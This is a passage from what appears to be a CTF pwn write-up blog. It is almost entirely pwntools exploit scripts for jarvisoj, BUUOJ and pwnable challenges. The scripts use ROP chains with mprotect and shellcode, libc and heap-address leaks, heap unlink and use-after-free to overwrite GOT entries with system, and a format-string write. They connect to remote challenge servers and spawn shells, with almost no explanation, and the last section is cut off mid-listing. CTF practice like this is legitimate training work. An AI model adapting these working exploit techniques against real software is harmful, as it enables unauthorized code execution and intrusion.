class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("level3_x64")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	if debug == 1:</span><br><span class="line">		sh = process("./level3_x64")</span><br><span class="line">		lib = ELF("libc6_2.23-0ubuntu10_amd64.so")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("libc6_2.19-0ubuntu6.14_amd64.so")</span><br><span class="line">	offset = 136</span><br><span class="line">	pop_rdi_ret = 0x00000000004006b3</span><br><span class="line">	pop_rsi_r15_ret = 0x00000000004006b1</span><br><span class="line">	pop_rbx_rbp_r12_r13_r14_r15_ret = 0x00000000004006AA</span><br><span class="line">	mov_edx_call = 0x0000000000400690</span><br><span class="line">	vul_addr = 0x00000000004005E6</span><br><span class="line">	#leak libc</span><br><span class="line">	payload = offset * "a"</span><br><span class="line">	payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(elf.got['__libc_start_main']) + p64(0) + p64(elf.plt['write']) + p64(elf.symbols['main'])</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil("Input:\n")</span><br><span class="line">	__libc_start_main = u64(sh.recv(8))</span><br><span class="line">	libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">	mprotect_addr = libc + lib.symbols['mprotect']</span><br><span class="line">	log.success("__libc_start_main: " + hex(__libc_start_main))</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	log.success("mprotect_addr: " + hex(mprotect_addr))</span><br><span class="line">	#write shellcode to bss and write vul_addr to bss_head</span><br><span class="line">	payload = offset * "a"</span><br><span class="line">	payload += p64(pop_rdi_ret) + p64(0) #rdi = 0</span><br><span class="line">	payload += p64(pop_rsi_r15_ret) + p64(elf.bss()) + p64(0) #rsi=bss   r15 = 0</span><br><span class="line">	payload += p64(elf.plt['read']) + p64(vul_addr)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	payload = p64(mprotect_addr) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil("Input:\n")</span><br><span class="line">	#mprotect</span><br><span class="line">	payload = offset * "a"</span><br><span class="line">	payload += p64(pop_rbx_rbp_r12_r13_r14_r15_ret)</span><br><span class="line">	payload += p64(0) #rbx</span><br><span class="line">	payload += p64(1) #rbp</span><br><span class="line">	payload += p64(elf.bss()) #r12</span><br><span class="line">	payload += p64(7) #r13 to rdx</span><br><span class="line">	payload += p64(0x1000) #r14 to rsi</span><br><span class="line">	payload += p64((elf.bss() >> 16) << 16) #r15 to rdi</span><br><span class="line">	payload += p64(mov_edx_call)</span><br><span class="line">	payload += p64(0) * 7</span><br><span class="line">	payload += p64(vul_addr)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil("Input:\n")</span><br><span class="line">	payload = offset * "a"</span><br><span class="line">	payload += p64(elf.bss() + 8)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	#nc pwn2.jarvisoj.com 9884</span><br><span class="line">	pwn("pwn2.jarvisoj.com",9884,1)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x87-jarvisoj-level6"><a href="#0x87-jarvisoj-level6" class="headerlink" title="0x87 jarvisoj_level6"></a>0x87 jarvisoj_level6</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = 0</span><br><span class="line">elf = ELF("freenote_x86")</span><br><span class="line">def showlist():</span><br><span class="line">	sh.recvuntil("Your choice: ")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil("Your choice: ")</span><br><span class="line">	sh.sendline("2")</span><br><span class="line">	sh.recvuntil("Length of new note: ")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil("Enter your note: ")</span><br><span class="line">	sh.send(content)</span><br><span class="line">def free(index):</span><br><span class="line">	sh.recvuntil("Your choice: ")</span><br><span class="line">	sh.sendline("4")</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">def edit(index,size,content):</span><br><span class="line">	sh.recvuntil("Your choice: ")</span><br><span class="line">	sh.sendline("3")</span><br><span class="line">	sh.recvuntil("Note number: ")</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil("Length of note: ")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil("Enter your note: ")</span><br><span class="line">	sh.send(content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	#bss 804A2EC</span><br><span class="line">	global sh</span><br><span class="line">	offset = 0</span><br><span class="line">	if debug == 1:</span><br><span class="line">		lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">		sh = process("./freenote_x86")</span><br><span class="line">	else:</span><br><span class="line">		lib = ELF("libc-2.23_x32.so")</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	add(7,"a"*7)	#idx 0</span><br><span class="line">	add(7,'a'*7)	#idx 1</span><br><span class="line">	free(0)</span><br><span class="line">	add(4,"aaaa")		#idx 2</span><br><span class="line">	showlist()</span><br><span class="line">	sh.recvuntil("0. aaaa")</span><br><span class="line">	libc = u32(sh.recv(4)) - 48 - 0x18 - lib.symbols['__malloc_hook']</span><br><span class="line">	__malloc_hook = libc - 8</span><br><span class="line">	add(7,"b"*7)	#idx 3</span><br><span class="line">	add(7,"c"*7)	#idx 4</span><br><span class="line">	free(0)</span><br><span class="line">	free(2)</span><br><span class="line">	add(4,"aaaa")</span><br><span class="line">	showlist()</span><br><span class="line">	sh.recvuntil("0. aaaa")</span><br><span class="line">	heap_base = (u32(sh.recv(4)) >> 12) << 12</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(3)</span><br><span class="line">	payload = p32(0x0) + p32(0x81) + p32(heap_base + 0x18 - 12) + p32(heap_base + 0x18 - 8) + p32(0x80)	#chunk0</span><br><span class="line">	payload = payload.ljust(0x80,"6")</span><br><span class="line">	payload += p32(0x80) + p32(0x80)	#chunk1</span><br><span class="line">	payload = payload.ljust(256,"9")</span><br><span class="line">	payload += p32(0x80) + p32(0x81)	#chunk2</span><br><span class="line">	add(len(payload),payload)</span><br><span class="line">	free(1)</span><br><span class="line">	payload = "a"*20</span><br><span class="line">	add(len(payload),payload)</span><br><span class="line">	showlist()</span><br><span class="line">	system_addr = libc + lib.symbols['system']</span><br><span class="line">	binsh_addr = libc + next(lib.search("/bin/sh\x00"))</span><br><span class="line">	add(0x50,0x50*"a")</span><br><span class="line">	payload = "\x250\x00\x00" + p32(1)+p32(0x4) + p32(elf.got['free']) + p32(1) + p32(0x14) + p32(heap_base+0xc280) + p32(1) + p32(0x8) + p32(heap_base + 0xda8) + p32(0) + p32(heap_base + 0xB80) + p32(0)</span><br><span class="line">	payload = payload.ljust(0x108,"\x00")</span><br><span class="line">	edit(0,0x108,payload)</span><br><span class="line">	edit(0,4,p32(system_addr))</span><br><span class="line">	edit(2,8,"/bin/sh\x00")</span><br><span class="line">	showlist()</span><br><span class="line">	free(2)</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	log.success("heap_base: " + hex(heap_base))	</span><br><span class="line">	log.success("system_addr: " + hex(system_addr))</span><br><span class="line">	log.success("binsh_addr: " + hex(binsh_addr))</span><br><span class="line">	sh.interactive()	</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	#nc pwn2.jarvisoj.com 9885	</span><br><span class="line">	pwn("node3.buuoj.cn",27261,0)</span><br></pre></td></tr></tbody></table></figure></div>


<h2 id="0x88-jarvisoj-level6-x64"><a href="#0x88-jarvisoj-level6-x64" class="headerlink" title="0x88 jarvisoj_level6(x64)"></a>0x88 jarvisoj_level6(x64)</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("freenote_x64")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def showlist():</span><br><span class="line">	sh.recvuntil("Your choice: ")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil("Your choice: ")</span><br><span class="line">	sh.sendline("2")</span><br><span class="line">	sh.recvuntil("Length of new note: ")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil("Enter your note: ")</span><br><span class="line">	sh.send(content)</span><br><span class="line">def free(index):</span><br><span class="line">	sh.recvuntil("Your choice: ")</span><br><span class="line">	sh.sendline("4")</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">def edit(index,size,content):</span><br><span class="line">	sh.recvuntil("Your choice: ")</span><br><span class="line">	sh.sendline("3")</span><br><span class="line">	sh.recvuntil("Note number: ")</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil("Length of note: ")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil("Enter your note: ")</span><br><span class="line">	sh.send(content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	offset = 0</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./freenote_x64")</span><br><span class="line">		lib = ELF("libc-2.23.so")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("libc-2.23_x64.so")</span><br><span class="line">	#leak libc</span><br><span class="line">	add(0x80,"a"*0x80)#idx 0</span><br><span class="line">	add(0x80,"b"*0x80)#idx 1</span><br><span class="line">	free(0)</span><br><span class="line">	add(0x8,"a"*8)#idx 0</span><br><span class="line">	showlist()</span><br><span class="line">	sh.recvuntil("0. aaaaaaaa")</span><br><span class="line">	libc = u64(sh.recvuntil("\x0a",True).ljust(0x8,"\x00")) - 88 - lib.symbols['__malloc_hook'] - 0x10</span><br><span class="line">	system_addr = libc + lib.symbols['system']</span><br><span class="line">	binsh = libc + next(lib.search("/bin/sh\x00"))</span><br><span class="line">	#leak heap_base</span><br><span class="line">	add(0x80,"c"*0x80) #idx 2</span><br><span class="line">	add(0x80,"d"*0x80) #idx 3</span><br><span class="line">	free(0)</span><br><span class="line">	free(2)</span><br><span class="line">	add(0x8,"d"*8)</span><br><span class="line">	showlist()</span><br><span class="line">	sh.recvuntil("0. dddddddd")</span><br><span class="line">	heap_base = sh.recvuntil("\x0a",True)</span><br><span class="line">	heap_base = heap_base.ljust(0x8,"\x00")</span><br><span class="line">	heap_base = (u64(heap_base) - 0x1000)</span><br><span class="line">	heap_base = (heap_base >> 12) << 12</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(3)	</span><br><span class="line">	#unlink</span><br><span class="line">	payload = p64(0x0) + p64(0x81) + p64(heap_base + 6 * 0x8 - 0x18) + p64(heap_base + 0x8 * 6 - 0x10)</span><br><span class="line">	payload = payload.ljust(0x80,"\xbb")</span><br><span class="line">	payload += p64(0x80) + p64(0x80)</span><br><span class="line">	payload = payload.ljust(0x80+0x80,"\xaa")</span><br><span class="line">	add(len(payload),payload)</span><br><span class="line">	#input()</span><br><span class="line">	free(1)</span><br><span class="line">	payload = p64(1) + p64(1) + p64(0x100) + p64(heap_base + 0x18) + p64(1) + p64(8) + p64(heap_base + 0x1840) + p64(0) * 2 + p64(heap_base + 0x1950) + p64(0) + p64(0) + p64(heap_base + 0x19e0)</span><br><span class="line">	payload = payload.ljust(0x400,"a")</span><br><span class="line">	add(0x400,payload)</span><br><span class="line">	add(0x8,"\x44"*0x8)</span><br><span class="line">	#write system to free_got</span><br><span class="line"></span><br><span class="line">	payload = p64(2) + p64(1) + p64(0x100) + p64(heap_base + 0x18) + p64(1) + p64(0x8) + p64(elf.got['free']) + p64(1) + p64(0x8) + p64(heap_base + 0x1950) + p64(0) + p64(0) + p64(heap_base + 0x19e0)</span><br><span class="line">	payload = payload.ljust(0x100,"a")</span><br><span class="line">	edit(0,0x100,payload)</span><br><span class="line">	showlist()</span><br><span class="line">	edit(1,0x8,p64(system_addr))</span><br><span class="line">	payload = p64(2) + p64(1) + p64(0x100) + p64(heap_base + 0x18) + p64(1) + p64(8) + p64(binsh)+ p64(1) + p64(0x8) + p64(heap_base + 0x1950) + p64(1) + p64(0x8) +  p64(heap_base + 0x19e0)</span><br><span class="line">	payload = payload.ljust(0x100,"a")	</span><br><span class="line">	edit(0,0x100,payload)</span><br><span class="line">	free(1)</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	log.success("binsh: " + hex(binsh))</span><br><span class="line">	log.success("system_addr: " + hex(system_addr))</span><br><span class="line">	log.success("heap_base: " + hex(heap_base))</span><br><span class="line">	#gdb.attach(sh.pid)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("node3.buuoj.cn",29160,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x89-jarvisoj-test-your-memory"><a href="#0x89-jarvisoj-test-your-memory" class="headerlink" title="0x89 jarvisoj_test_your_memory"></a>0x89 jarvisoj_test_your_memory</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = remote("node3.buuoj.cn",29078)</span><br><span class="line">#sh = process("memory")</span><br><span class="line">system_address = 0x080485BD</span><br><span class="line">junk = 'a' * 0x13</span><br><span class="line">ebp = 'a' * 0x4</span><br><span class="line">payload = junk + ebp + p32(system_address) + p32(0x080487E0) + p32(0x080487E0)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x90-jarvisoj-itemboard"><a href="#0x90-jarvisoj-itemboard" class="headerlink" title="0x90 jarvisoj_itemboard"></a>0x90 jarvisoj_itemboard</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">lib = ELF("libc-2.23_x64.so")</span><br><span class="line">sh = 0</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil("choose:\n")</span><br><span class="line">	sh.sendline("4")</span><br><span class="line">	sh.recvuntil("Which item?\n")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.recvuntil("choose:\n")</span><br><span class="line">	sh.sendline("3")</span><br><span class="line">	sh.recvuntil("Which item?")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def showList():</span><br><span class="line">	sh.recvuntil("choose:\n")</span><br><span class="line">	sh.sendline("2")</span><br><span class="line"></span><br><span class="line">def add(name,size,content):</span><br><span class="line">	sh.recvuntil("choose:\n")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("Item name?")</span><br><span class="line">	sh.sendline(name)</span><br><span class="line">	sh.recvuntil("len?\n")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil("Description?\n")</span><br><span class="line">	sh.sendline(content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./itemboard")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	add("a"*0x10,0x80,"1"*0x7F)</span><br><span class="line">	add("b"*0x10,0x10,"2"*0xF)</span><br><span class="line">	free(0)</span><br><span class="line">	show(0)</span><br><span class="line">	sh.recvuntil("Description:")</span><br><span class="line">	main_arena = u64(sh.recv(6)+"\x00\x00") - 88</span><br><span class="line">	libc = main_arena - lib.symbols['__malloc_hook'] - 0x10</span><br><span class="line">	system_addr = libc + lib.symbols['system']</span><br><span class="line">	add("c"*0x10,0x20,"3"*0xF)</span><br><span class="line">	add("d"*0x10,0x20,"4"*0xF)</span><br><span class="line">	free(1)</span><br><span class="line">	free(2)</span><br><span class="line">	show(2)</span><br><span class="line">	log.success("main_arena: " + hex(main_arena))</span><br><span class="line">	log.success("system_addr: " + hex(system_addr))</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	add("6666",24,"/bin/sh;eeeeeeee"+p64(system_addr))</span><br><span class="line">	free(1)</span><br><span class="line"></span><br><span class="line">	sh.interactive()</span><br><span class="line">#nc pwn2.jarvisoj.com 9887</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("node3.buuoj.cn",27048,0)</span><br></pre></td></tr></tbody></table></figure></div>


<h2 id="0x91-jarvisoj-fm"><a href="#0x91-jarvisoj-fm" class="headerlink" title="0x91 jarvisoj_fm"></a>0x91 jarvisoj_fm</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = remote("node3.buuoj.cn",28276)</span><br><span class="line">#sh = process("./fm")</span><br><span class="line">payload = p32(0x0804A02C)+'%11$n'</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x92-pwnable-orw"><a href="#0x92-pwnable-orw" class="headerlink" title="0x92 pwnable_orw"></a>0x92 pwnable_orw</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("orw")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global lib</span><br><span class="line">	global sh</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./orw")</span><br><span class="line">		lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">	shellcode = shellcraft.open("/flag")</span><br><span class="line">	shellcode += shellcraft.read(3,elf.bss(),0x100)</span><br><span class="line">	shellcode += shellcraft.write(1,elf.bss(),0x100)</span><br><span class="line">	sh.sendline(asm(shellcode))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("node3.buuoj.cn",28498,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x93-jarvisoj-typo"><a href="#0x93-jarvisoj-typo" class="headerlink" title="0x93 jarvisoj_typo"></a>0x93 jarvisoj_typo</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#sh = process("./typo")</span><br><span class="line">sh = remote("node3.buuoj.cn",28213)</span><br><span class="line">elf = ELF("typo")</span><br><span class="line">offset = 112</span><br><span class="line">pop3_ret = 0x00020904</span><br><span class="line">payload  = offset * "a" </span><br><span class="line">payload += p32(pop3_ret) + p32(elf.search("/bin/sh\x00").next()) + p32(0) + p32(0x110B4)</span><br><span class="line">sh.sendlineafter("\n","")</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x94-others-shellcode"><a href="#0x94-others-shellcode" class="headerlink" title="0x94 others_shellcode"></a>0x94 others_shellcode</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">连接就出flag 有点水</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x95-huxiangbei-2019-hacknote"><a href="#0x95-huxiangbei-2019-hacknote" class="headerlink" title="0x95 huxiangbei_2019_hacknote"></a>0x95 huxiangbei_2019_hacknote</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 